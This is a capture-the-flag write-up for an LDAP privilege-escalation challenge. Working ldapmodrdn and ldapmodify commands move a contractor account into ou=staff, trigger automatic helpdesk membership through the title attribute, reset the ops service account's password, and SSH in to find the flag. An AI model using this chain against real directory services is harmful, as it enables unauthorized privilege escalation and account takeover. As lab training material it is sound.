# [Self-service](https://nnsc.tf/challenges?challenge=devsecoops_Self-service)

**Description:**

You are our brand new contractor at NNS corp! You have been given a user account: ereid:Summer2026. Welcome on board!

## 1. Connect

```bash
ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p' ereid@self-service-c7fe0811856c.chall.nnsc.tf -p 1337
```

Password: `Summer2026`

The login shell is PowerShell, and a custom module called `SelfService` is auto-loaded.

## 2. Look at what's available

```powershell
Get-Command -Module SelfService
```

Three functions: `Get-MyDirectoryEntry`, `Get-MyDn`, `Set-MyDirectoryAttribute`. Check where the module lives on disk and whether you can read it:

```powershell
Get-Module SelfService | Select-Object -ExpandProperty Path
Get-Content /opt/corp/SelfService.psm1
```

The file is world-readable. Reading it directly is faster and more reliable than guessing behavior from `Get-Help`.

The source shows:

- `$script:Base = 'dc=corp,dc=nns'`, `$script:Uri = 'ldap://dir:3389'`
- `Get-MyDn` builds an LDAP filter by string interpolation with no escaping
- `Set-MyDirectoryAttribute` builds an LDIF and calls `ldapmodify` with whatever attribute name and value you give it. It does not check an allowlist itself. Whatever gets blocked is blocked only by the LDAP server's actual ACL.

The shell is `FullLanguage` mode, and `ldapsearch`, `ldapmodify`, `ldapwhoami`, `ldapmodrdn` are all directly callable from PowerShell. You don't need to go through the module's wrapper functions at all, you can call the LDAP binaries yourself with full control over the arguments.

## 3. Find your DN and check your rights

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -b 'dc=corp,dc=nns' '(uid=ereid)' dn
```

Result: `uid=ereid,ou=contractors,dc=corp,dc=nns`

Check your effective permissions on your own entry using the GetEffectiveRights control:

```powershell
$out = & ldapsearch -x -LLL -H ldap://dir:3389 -D 'uid=ereid,ou=contractors,dc=corp,dc=nns' -w 'Summer2026' -b 'uid=ereid,ou=contractors,dc=corp,dc=nns' -s base -E '!1.3.6.1.4.1.42.2.27.9.5.2=:dn: uid=ereid,ou=contractors,dc=corp,dc=nns' '(objectClass=*)' '*'
$out | Out-File -FilePath /tmp/rights.txt -Width 4096
Get-Content /tmp/rights.txt
```

The `-Width 4096` on `Out-File` matters, otherwise the terminal wraps the long `attributeLevelRights` line and you lose data.

Relevant facts from the output:

- `memberOf`, `uidNumber`, `gidNumber` are read-only. No direct group-join or UID-0 path.
- `title`, `businessCategory`, `sn`, `description`, and several other cosmetic attributes are writable.
- Your entry lists `memberOf: cn=onboarding-agents,ou=groups,dc=corp,dc=nns`.

## 4. Read the ACIs to understand what onboarding-agents can do

ACIs on user entries were empty. Pull them from the base and from the `ops` entry:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D 'uid=ereid,ou=contractors,dc=corp,dc=nns' -w 'Summer2026' -b 'dc=corp,dc=nns' -s base 'aci'
```

Two ACIs are the key ones:

```
(target_from = "ldap:///ou=contractors,dc=corp,dc=nns")
(target_to = "ldap:///ou=staff,dc=corp,dc=nns")
acl "Contractor to permanent conversion";
allow (moddn) groupdn = "ldap:///cn=onboarding-agents,ou=groups,dc=corp,dc=nns";
```

This lets any member of `onboarding-agents` move any entry from `ou=contractors` to `ou=staff`. There is no restriction excluding the actor's own DN. You are a member of that group, so you can move yourself.

The group's own description even states the intended process: "May move contractor accounts into ou=staff when they convert to permanent." The bug is that the ACL doesn't enforce that the mover and the target must be different people.

## 5. Promote yourself to staff

```powershell
ldapmodrdn -x -D 'uid=ereid,ou=contractors,dc=corp,dc=nns' -w 'Summer2026' -H ldap://dir:3389 -r -s 'ou=staff,dc=corp,dc=nns' 'uid=ereid,ou=contractors,dc=corp,dc=nns' 'uid=ereid'
```

- `-r` deletes the old RDN attribute value after the move
- `-s` specifies the new parent DN, this is what actually performs the subtree move

Verify:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -b 'dc=corp,dc=nns' '(uid=ereid)' dn
```

Should now read `uid=ereid,ou=staff,dc=corp,dc=nns`.

## 6. Find the helpdesk auto-provisioning trigger

`cn=helpdesk`'s description says "Members are provisioned automatically from HR attributes." Pull the full entries of the three existing helpdesk members and compare attributes to find the common value:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -w 'Summer2026' -b 'uid=agrant,ou=staff,dc=corp,dc=nns' -s base '*'
ldapsearch -x -LLL -H ldap://dir:3389 -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -w 'Summer2026' -b 'uid=cnovak,ou=staff,dc=corp,dc=nns' -s base '*'
ldapsearch -x -LLL -H ldap://dir:3389 -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -w 'Summer2026' -b 'uid=pdelgado,ou=staff,dc=corp,dc=nns' -s base '*'
```

All three have `title: Platform Engineer`. Their `departmentNumber` differs, so `title` is the actual trigger, not department.

## 7. Set your title and get pulled into helpdesk

```powershell
Set-MyDirectoryAttribute -Name title -Value 'Platform Engineer'
```

Check membership after:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -w 'Summer2026' -b 'cn=helpdesk,ou=groups,dc=corp,dc=nns' -s base member
```

`uid=ereid,ou=staff,dc=corp,dc=nns` appears in the member list.

## 8. Abuse helpdesk's write access to `ops`'s password

The same base-DN ACI dump from step 4 also showed, directly on the `ops` entry:

```
(targetattr = "userPassword")
acl "Helpdesk resets service account passwords";
allow (write) groupdn = "ldap:///cn=helpdesk,ou=groups,dc=corp,dc=nns";
```

Now that you're a helpdesk member, set a known password on `ops`:

```powershell
$ldif = "dn: uid=ops,ou=staff,dc=corp,dc=nns`nchangetype: modify`nreplace: userPassword`nuserPassword: Pwned123!`n"
$ldif | ldapmodify -x -H ldap://dir:3389 -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -w 'Summer2026'
```

Confirm the bind works:

```powershell
ldapwhoami -x -H ldap://dir:3389 -D 'uid=ops,ou=staff,dc=corp,dc=nns' -w 'Pwned123!'
```

A successful `dn:` response back confirms the password change took effect.

## 9. Get a shell as `ops` and find the flag

`ops`'s `gecos` field read "Operations service account (backup/restore on srv2)", which is a hint about where to go next. Check `/etc/hosts` for that hostname, then SSH in:

```powershell
Get-Content /etc/hosts
ssh ops@srv2
```

Password: `Pwned123!`

Once logged in as `ops`, look for the flag in the account's home directory and any backup/restore locations implied by the gecos note:

```bash
ls -la ~
cat ~/flag* 2>/dev/null
find / -iname '*flag*' 2>/dev/null
```
